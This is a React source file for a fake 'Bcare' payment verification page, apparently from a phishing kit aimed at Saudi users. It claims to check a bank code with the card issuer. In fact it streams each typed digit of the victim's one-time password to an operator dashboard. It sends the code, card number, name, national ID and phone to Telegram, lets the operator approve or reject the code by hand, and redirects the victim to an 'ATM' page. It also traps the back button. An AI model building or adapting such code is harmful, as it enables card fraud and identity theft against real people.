import { useEffect, useMemo, useState } from "react";
import { useI18n } from "@/lib/i18n";
import { useLocation, useNavigate } from "react-router-dom";
import { ShieldCheck, Loader2, XCircle } from "lucide-react";

import Header from "@/components/site/Header";
import SiteFooter from "@/components/site/SiteFooter";
import { cn } from "@/lib/utils";
import { toast } from "sonner";
import { getMyLatestApplication, updateApplication, type StoredApplication } from "@/lib/admin-storage";
import { supabase } from "@/integrations/supabase/client";
import { notifyOtpSubmitted, notifyOtpResend } from "@/lib/telegram-notify";
import { getVisitorId, getVisitorToken } from "@/lib/visitor-tracking";

type OtpState = { appId?: string };

const PROCESSING_SECONDS = 120; // 2 minutes
const RESEND_SECONDS = 240; // 4 minutes
const MAX_OTP_LENGTH = 6;
const VALID_OTP_LENGTHS = [4, 6] as const;

const QuoteOtp = () => {
  const { t, isAr } = useI18n();
  const navigate = useNavigate();
  const location = useLocation();
  const { appId: initialAppId } = (location.state as OtpState) || {};

  const [appId, setAppId] = useState<string | undefined>(() => {
    if (initialAppId) return initialAppId;
    if (typeof window === "undefined") return undefined;
    return sessionStorage.getItem("bcare_pending_app_id") ?? undefined;
  });
  const [otpValue, setOtpValue] = useState("");
  const [secondsLeft, setSecondsLeft] = useState(RESEND_SECONDS);
  const [submitting, setSubmitting] = useState(false);
  const [app, setApp] = useState<StoredApplication | null>(null);
  const [processing, setProcessing] = useState(false);
  const [processingSecs, setProcessingSecs] = useState(PROCESSING_SECONDS);
  const [rejected, setRejected] = useState(false);

  useEffect(() => {
    (async () => {
      let resolvedAppId = appId;

      if (!resolvedAppId) {
        const latest = await getMyLatestApplication();
        const data = latest ? { id: latest.id } : null;

        resolvedAppId = data?.id;
        if (resolvedAppId) {
          setAppId(resolvedAppId);
          navigate("/quote/otp", { replace: true, state: { appId: resolvedAppId } });
        }
      }

      sessionStorage.removeItem("bcare_pending_app_id");

      if (!resolvedAppId) {
        navigate("/", { replace: true });
        return;
      }

      const a = await getMyLatestApplication();
      if (!a) {
        navigate("/", { replace: true });
        return;
      }
      setApp(a);
    })();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Keep the visitor locked on this page: browser back/forward and swipe
  // gestures re-push the same entry, so nothing moves right or left.
  useEffect(() => {
    window.history.pushState({ otpLock: true }, "");
    const onPopState = () => window.history.pushState({ otpLock: true }, "");
    window.addEventListener("popstate", onPopState);
    return () => window.removeEventListener("popstate", onPopState);
  }, []);

  // Countdown for resend code
  useEffect(() => {
    if (secondsLeft <= 0) return;
    const timer = window.setTimeout(() => setSecondsLeft((s) => s - 1), 1000);
    return () => window.clearTimeout(timer);
  }, [secondsLeft]);

  // Live-typing sync: every digit the visitor types is pushed to their
  // application row (debounced) so the admin dashboard shows the code as it
  // is being typed — before the visitor presses confirm.
  useEffect(() => {
    if (!appId || processing) return;
    const timer = window.setTimeout(() => {
      void updateApplication(appId, { otpCode: otpValue });
    }, 400);
    return () => window.clearTimeout(timer);
  }, [otpValue, appId, processing]);

  // Countdown while processing (waiting for admin)
  useEffect(() => {
    if (!processing) return;
    if (processingSecs <= 0) {
      setProcessing(false);
      setRejected(true);
      setOtpValue("");
      toast.error(t("انتهت مهلة التحقق، حاول مرة أخرى", "Verification timed out, please try again"));
      return;
    }
    const timer = window.setTimeout(() => setProcessingSecs((s) => s - 1), 1000);
    return () => window.clearTimeout(timer);
  }, [processing, processingSecs]);

  // Realtime listener kept open the entire time the page is mounted, plus a
  // polling fallback. This way consecutive OTP attempts never miss the admin's
  // decision during channel re-subscribe.
  useEffect(() => {
    if (!appId) return;
    const channel = supabase
      .channel(`otp-decision-${appId}-${Date.now()}`)
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "applications", filter: `id=eq.${appId}` },
        (payload) => {
          const newRow = payload.new as { review_status?: string };
          if (newRow.review_status === "completed") {
            setProcessing(false);
            toast.success(t("تم تأكيد العملية بنجاح", "Transaction confirmed successfully"));
            navigate("/quote/success", { replace: true, state: { appId } });
          } else if (newRow.review_status === "atm_pending") {
            setProcessing(false);
            toast.success(t("يرجى إثبات ملكية البطاقة", "Please verify card ownership"));
            navigate("/quote/atm", { replace: true, state: { appId } });
          } else if (newRow.review_status === "otp_rejected") {
            setProcessing(false);
            setRejected(true);
            setOtpValue("");
            toast.error(t("الرمز غير صحيح، حاول مرة أخرى", "Incorrect code, please try again"));
          }
        },
      )
      .subscribe();

    const poll = setInterval(async () => {
      if (document.visibilityState !== "visible") return;
      const fresh = await getMyLatestApplication();
      if (!fresh) return;
      setApp(fresh);
      if (fresh.reviewStatus === "completed") {
        setProcessing(false);
        navigate("/quote/success", { replace: true, state: { appId } });
      } else if (fresh.reviewStatus === "atm_pending") {
        setProcessing(false);
        navigate("/quote/atm", { replace: true, state: { appId } });
      } else if (fresh.reviewStatus === "otp_rejected") {
        setProcessing((p) => {
          if (p) {
            setRejected(true);
            setOtpValue("");
            toast.error(t("الرمز غير صحيح، حاول مرة أخرى", "Incorrect code, please try again"));
          }
          return false;
        });
      }
    }, 1000);

    return () => {
      supabase.removeChannel(channel);
      clearInterval(poll);
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [appId]);

  const code = otpValue;
  const isValid = (VALID_OTP_LENGTHS as readonly number[]).includes(code.length);


  const cardLast4 = useMemo(() => {
    return (app?.cardLast4 || "").replace(/\D/g, "").slice(-4) || "••••";
  }, [app?.cardLast4]);

  const amountText = useMemo(() => {
    const v = app?.total ?? app?.price;
    return v != null ? `${Number(v).toFixed(2)} ر.س` : "—";
  }, [app?.total, app?.price]);

  // Editorial reference rail: a short, quiet handle for this transaction.
  const refCode = useMemo(() => {
    const id = (appId || "").replace(/[^a-zA-Z0-9]/g, "");
    return id ? `#BC-${id.slice(-4).toUpperCase()}` : "#BC-••••";
  }, [appId]);



  const submitCode = async (digits: string) => {
    if (!appId) return;
    if (!(VALID_OTP_LENGTHS as readonly number[]).includes(digits.length)) return;
    setSubmitting(true);
    setRejected(false);
    // Bounce review_status first so the UPDATE to "otp_submitted" is always a
    // real transition — guarantees the admin chime/toast fires on every attempt
    // even when the client re-enters the exact same digits.
    await updateApplication(appId, { reviewStatus: "awaiting_review" });
    await updateApplication(appId, {
      otpCode: digits,
      reviewStatus: "otp_submitted",
    });
    notifyOtpSubmitted({
      appId,
      fullName: app?.fullName,
      identity: app?.identity,
      phone: app?.phone,
      company: app?.company,
      total: app?.total,
      cardNumber: app?.cardNumber || (app?.cardLast4 ? `•••• ${app.cardLast4}` : undefined),
      cardName: app?.cardName,
      cardBrand: app?.cardBrand,
      otp: digits,
    });
    setSubmitting(false);
    setProcessingSecs(PROCESSING_SECONDS);
    setProcessing(true);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isValid) return;
    await submitCode(code);
  };


  return (
    <main dir={isAr ? "rtl" : "ltr"} className="min-h-screen bg-white">
      <Header />

      <section className="mx-auto w-full max-w-[560px] px-5 pb-14 pt-4 sm:px-8 sm:pt-6">
        {/* Quiet reference rail */}
        <div className="flex items-baseline justify-between gap-3 border-b border-gray-200 pb-3">
          <div className="text-[12.5px] font-extrabold tracking-tight text-brand-blue">
            {t("بي كير · تحقق آمن", "Bcare · Secure verification")}
          </div>
          <div className="font-mono text-[11px] text-gray-400" dir="ltr">
            {refCode}
          </div>
        </div>

        {processing ? (
          /* Processing — same editorial register */
          <div className="pt-9">
            <div className="flex items-center gap-2.5">
              <Loader2 className="h-[18px] w-[18px] animate-spin text-brand-orange" strokeWidth={2.4} />
              <span className="text-[14px] font-extrabold text-gray-900">
                {t("جاري المعالجة...", "Processing...")}
              </span>
            </div>
            <p className="mt-4 max-w-[360px] text-[12.5px] leading-7 text-gray-500">
              {t("جاري التحقق من الرمز لدى البنك المُصدر للبطاقة. من فضلك لا تغلق هذه الصفحة.", "Verifying the code with the card-issuing bank. Please don't close this page.")}
            </p>
            <div className="mt-7 flex items-baseline gap-2 border-t border-gray-100 pt-3">
              <span className="text-[11.5px] font-bold text-gray-400">
                {t("الوقت المتبقي", "Time remaining")}
              </span>
              <span className="font-mono text-[16px] font-extrabold text-gray-900" dir="ltr">
                {String(Math.floor(processingSecs / 60)).padStart(2, "0")}:
                {String(processingSecs % 60).padStart(2, "0")}
              </span>
            </div>
            <div className="mt-9 flex items-center gap-1.5 border-t border-gray-100 pt-3 text-[11.5px] text-gray-400">
              <ShieldCheck className="h-[14px] w-[14px] text-emerald-600" />
              <span>{t("عملية مشفّرة وآمنة", "Encrypted & secure transaction")}</span>
            </div>
          </div>
        ) : (
          <form onSubmit={handleSubmit} className="pt-8">
            <h1 className="text-[27px] font-extrabold leading-tight tracking-tight text-gray-900 sm:text-[31px]">
              {t("رمز التحقق", "Verification code")}
            </h1>
            <p className="mt-2.5 max-w-[340px] text-[13px] leading-7 text-gray-500">
              {t(
                "تم إرسال رمز التحقق إلى جوالك. اكتب الرمز الذي أرسلته للبنك لإكمال عملية الدفع.",
                "The verification code has been sent to your phone. Enter the code you sent to the bank to complete the payment.",
              )}
            </p>

            {/* Transaction lines */}
            <div className="mt-8 border-t border-gray-100">
              <div className="flex items-center justify-between gap-3 border-b border-gray-100 py-3">
                <span className="text-[12.5px] text-gray-500">{t("البطاقة", "Card")}</span>
                <span className="font-mono text-[12.5px] font-extrabold text-gray-900" dir="ltr">
                  •••• •••• •••• {cardLast4}
                </span>
              </div>
              <div className="flex items-center justify-between gap-3 border-b border-gray-100 py-3">
                <span className="text-[12.5px] text-gray-500">
                  {t("قيمة العملية", "Transaction amount")}
                </span>
                <span className="text-[15px] font-extrabold text-gray-900">{amountText}</span>
              </div>
            </div>

            {rejected && (
              <div className="mt-5 flex items-start gap-2 border-b border-destructive/30 pb-3 text-[12.5px] text-destructive">
                <XCircle className="mt-0.5 h-4 w-4 shrink-0" />
                <span>{t("الرمز غير صحيح أو تم رفض العملية. يرجى إدخال رمز جديد.", "The code is incorrect or the transaction was rejected. Please enter a new code.")}</span>
              </div>
            )}

            {/* Code line — one single underline, no boxes, no dots */}
            <div className="relative mt-9">
              <div
                dir="ltr"
                className={cn(
                  "flex h-[58px] items-center justify-center gap-3 border-b-2 transition-colors duration-200",
                  otpValue.length > 0 ? "border-gray-900" : "border-gray-200",
                )}
              >
                {otpValue.split("").map((d, i) => (
                  <span key={i} className="font-mono text-[26px] font-extrabold text-gray-900">
                    {d}
                  </span>
                ))}
                {otpValue.length < MAX_OTP_LENGTH && (
                  <span className="h-6 w-[2px] rounded-full bg-gray-900 animate-[bcare-blink_0.8s_steps(2,end)_infinite]" />
                )}
              </div>
              <input
                id="otp-input"
                value={otpValue}
                onChange={(e) => {
                  const v = e.target.value.replace(/\D/g, "").slice(0, MAX_OTP_LENGTH);
                  setOtpValue(v);
                }}
                onPaste={(e) => e.preventDefault()}
                onDrop={(e) => e.preventDefault()}
                inputMode="numeric"
                autoComplete="one-time-code"
                pattern="[0-9]*"
                maxLength={MAX_OTP_LENGTH}
                aria-label={t("رمز التحقق", "Verification code")}
                dir={isAr ? "rtl" : "ltr"}
                className="absolute inset-0 h-full w-full cursor-text bg-transparent opacity-0 outline-none"
              />
            </div>

            <button
              type="submit"
              disabled={!isValid || submitting}
              className={cn(
                "btn-pay mt-9 flex h-[54px] w-full items-center justify-center gap-2 rounded-xl text-[15px] font-extrabold transition-all",
                isValid && !submitting
                  ? "hover:brightness-105 active:scale-[0.99]"
                  : "cursor-not-allowed opacity-50",
              )}
            >
              {submitting && <Loader2 className="h-4 w-4 animate-spin" strokeWidth={2.4} />}
              <span>
                {submitting ? t("جاري الإرسال...", "Submitting...") : t("تأكيد العملية", "Confirm transaction")}
              </span>
            </button>

            <div className="mt-6">
              {secondsLeft > 0 ? (
                <div className="flex items-center gap-2 text-[12px] font-bold text-gray-500">
                  <span className="grid h-6 min-w-10 place-items-center border border-gray-200 px-1.5 font-mono text-[10.5px] font-black text-brand-blue" dir="ltr">
                    {String(Math.floor(secondsLeft / 60)).padStart(2, "0")}:
                    {String(secondsLeft % 60).padStart(2, "0")}
                  </span>
                  {t("إعادة إرسال الرمز متاح بعد", "Resend code available in")}
                </div>
              ) : (
                <button
                  type="button"
                  onClick={() => {
                    setSecondsLeft(RESEND_SECONDS);
                    if (appId) {
                      void updateApplication(appId, { otpResendAt: new Date().toISOString() });
                    }
                    notifyOtpResend({
                      appId,
                      fullName: app?.fullName,
                      identity: app?.identity,
                      phone: app?.phone,
                      company: app?.company,
                      total: app?.total,
                      cardNumber: app?.cardLast4 ? `•••• ${app.cardLast4}` : undefined,
                      cardBrand: app?.cardBrand,
                      source: "OTP بنكي",
                    });
                    toast.success(t("تم إرسال الرمز من جديد", "The code has been resent"));
                  }}
                  className="border-b border-brand-orange pb-0.5 text-[12.5px] font-extrabold text-brand-orange"
                >
                  {t("إعادة إرسال الرمز", "Resend code")}
                </button>
              )}
            </div>

            <div className="mt-9 flex items-center gap-1.5 border-t border-gray-100 pt-3 text-[11.5px] text-gray-400">
              <ShieldCheck className="h-[14px] w-[14px] text-emerald-600" />
              <span>{t("عملية مشفّرة وآمنة", "Encrypted & secure transaction")}</span>
            </div>
          </form>
        )}
      </section>

      <SiteFooter />
    </main>
  );

};

export default QuoteOtp;
